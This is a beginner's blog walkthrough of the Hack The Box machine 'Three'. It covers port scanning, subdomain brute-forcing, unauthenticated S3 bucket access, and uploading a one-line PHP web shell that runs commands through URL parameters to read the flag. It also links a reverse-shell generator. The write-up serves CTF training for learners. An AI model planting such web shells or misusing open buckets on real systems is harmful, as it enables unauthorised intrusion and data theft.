---
title: "HTB-Three"
description: "HTB-three writeup"
date: 2022-09-15
tags: ["hack-the-box", "security"]
---

![](/ox-hugo/three.png)

## Introduction

Hi everyone,

this is my first HTB-writeup. It is about the starting point machine **three**, which is made for beginners. I think that many people could find this walkthrough usefull if they are just starting with penetration-testing.

Enjoy.

## Connect to htb

To connect to your hack the box account, you need **openvpn**. You can install it easily using the following comand:

```bash
sudo apt install openvpn
```

After that, you have to download the .ovpn file from the htb website. Click on “connect to htb”, then click on “Starting Point”. Select “TCP” as protocol and just download the file.

Now you are ready to connect using the following comand:

```bash
sudo openvpn <filename.ovpn>
```

## Preparation

After you connected to htb using **openvpn**, you can **spawn the machine** by clicking on the yellow button.

![](/ox-hugo/spawn.png)

Now the IP adress of the machine should pop up. It is really important to save it in your /etc/hosts file. You can do it by adding the following line to the file:

```text
<ip_addr>    three
```

Now you can test if the host is up and running.

Just use the **ping** command:

```bash
ping three
```

## Enumeration

As it’s well known, to begin a penetration test it is always important to scan the target. I generally use **nmap** with a couple of flags, as shown below:

```bash
sudo nmap -sC -sV three
```

This basic scan will launch a series of default scripts and will provide more information on the versions of the services that are running on open ports. Here’s the output that I got:

```text
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-15 10:14 CEST
Nmap scan report for three (10.129.101.217)
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Toppers
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.69 seconds
```

We can notice that an Apache server is running on port 80. Let’s try to navigate to [http://three:80](http://three:80) to see the website. Always play around with the web-page to discover vulnerabilites.

![](/ox-hugo/thetoppers.png)

As the hint says, let’s edit our /etc/hosts file, editing the line that we added before:

```text
<ip_addr>    thetoppers.htb
```

## Gobuster

Performing a in-depth search of hidden (non-protected) files and resources of a website is often a good starting point during a penetration test. This time htb helps us, and suggests to perform a sub-domain enumeration. To do that, we can use a really famous brute-force tool called **gobuster**. To do that, we first need a *wordlist* that gobuster can use. You can find many wordlists on the internet, containing the most common words and expressions used in subdomains, but this time we will create our own wordlist. Look carefully at the hint that htb gives:

![](/ox-hugo/hint.png)

We can see that there’s probably a 2-character combination that we have to find before the url.

The simplest thing to do here is generating all the permutations of 2-character words. (including lowercase letters and numeric characters from 1 to 9). We can do that by using a tool called crunch (pre-installed on kali linux):

```bash
crunch 2 2 abcdefghijklmnopqrstuvwxyz0123456789 > output.txt
```

Now we are ready to use gobuster in vhost mode (it will look for subdomains by visiting the generated URLs).

```bash
sudo gobuster vhost -u http://thetoppers.htb -w /home/matte/output.txt
```

```text
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://thetoppers.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /home/matte/output.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/09/15 10:23:28 Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb (Status: 502) [Size: 424]

===============================================================
2022/09/15 10:23:47 Finished
===============================================================
```

Here’s our hidden subdomain: **s3.thetoopers.htb**. Let’s add it to our /etc/hosts file, editing the same line as before. Here’s how my /etc/hosts file looks after this edit:

```text
127.0.0.1       localhost
127.0.1.1       kali
10.129.101.217  thetoppers.htb s3.thetoppers.htb
```

## AWS

This is what we get if we navigate to [http://s3.thetoppers.htb](http://s3.thetoppers.htb):

![](/ox-hugo/s3.png)

The subdomain is running **Amazon s3 (Simple Storage Service)**, which is a web-based cloud storage service. To interact with it, we can use the **aws** command line interface, called **awscli**. To access the **buckets** (“folders” containing files) that the server is hosting, we should setup the credentials. Sometimes online contents of this kind are not protected, and you can access them even without knowing security keys or passwords. Let’s do it to see if this is the case.

Use the following command to open an interactive menu to setup your credentials (you can type random words. If you don’t, the connection will not work properly).

```bash
aws configure
```

What we can do now is try to see if we can list the buckets that are hosted. We have to specify:

1.  The **endpoint**, that is the url where the s3 service is hosted;
2.  The command that we want to use, in this case **ls**;

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

Here’s the output that we get:

```text
2022-09-15 10:33:39 thetoppers.htb
```

which means that there is an actual bucket hosted there. Let’s try to list the content of that bucket, using this command (in this case we have to specify that we want to use the s3 protocol to get the objects inside that bucket):

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

Here’s the output that we get:

```text
			   PRE images/
2022-09-15 10:33:39          0 .htaccess
2022-09-15 10:33:39      11952 index.php
```

## PHP

The website is configured to run php files, so we might try to inject php files somehow. One thing we can try to do is uploading a php shell in the bucket, by using the **cp** command, that takes a local file as the input. I wrote the most basic shell you can have in php, this is the source code:

```php
<?php system($_GET["cmd"]); ?>
```

Otherwise, you can find many reverse shell on this website: [https://www.revshells.com/](https://www.revshells.com/).

Down below you can see how you can copy a file inside a bucket, you simply use **cp**:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

You can then re-run the list command to see that the shell was succesfully uploaded.

```text
                           PRE images/
2022-09-15 10:33:39          0 .htaccess
2022-09-15 10:33:39      11952 index.php
2022-09-15 12:24:13         64 shell.php
```

## Get root flag

Now that we injected the php file that the webserver can process, we can send remote commands by modifying and navigating to this URL: [http://thetoppers.htb/reverse.php?cmd](http://thetoppers.htb/reverse.php?cmd)\=<any\_command>. For example, you can list the files in the bucket like this:

```text
http://thetoppers.htb/reverse.php?cmd=ls+../
```

***And there’s the flag!***

To actually see the content of the flag.txt file you can send this command:

```text
http://thetoppers.htb/reverse.php?cmd=cat+../flag.txt
```

If the web-browser redirects you to some other web page, you can also use tools like **wget**:

```bash
wget http://thetoppers.htb/reverse.php?cmd=cat+../flag.txt
```

> root flag: a980d99281a28d638ac68b9bf9453c2b

Read other posts

---

[← HTB-Archetype](/posts/archetype/)
